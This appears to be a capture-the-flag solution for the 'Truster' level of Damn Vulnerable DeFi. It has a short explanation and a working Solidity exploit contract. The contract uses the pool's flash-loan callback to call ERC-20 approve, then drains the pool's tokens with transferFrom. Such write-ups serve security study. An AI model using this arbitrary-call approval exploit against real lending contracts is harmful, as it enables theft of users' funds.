# 3. Truster

- Here we had a backdoor - we didn’t steal the tokens with the first transaction but we called `ERC-20` function `approve` in order to create a backdoor to steal the tokens later

## Solution:

```solidity
contract TrusedLenderPoolExploiter {
    constructor(address pool, address token, address recovery) {
        bytes memory flashLoanData = abi.encodeWithSelector(
            DamnValuableToken(token).approve.selector, address(this), DamnValuableToken(token).balanceOf(address(pool))
        );
        TrusterLenderPool(pool).flashLoan(0, address(this), token, flashLoanData);

        DamnValuableToken(token).transferFrom(
            address(pool), recovery, DamnValuableToken(token).balanceOf(address(pool))
        );
    }
}

function test_truster() public checkSolvedByPlayer {
    new TrusedLenderPoolExploiter(address(pool), address(token), recovery);
}
```
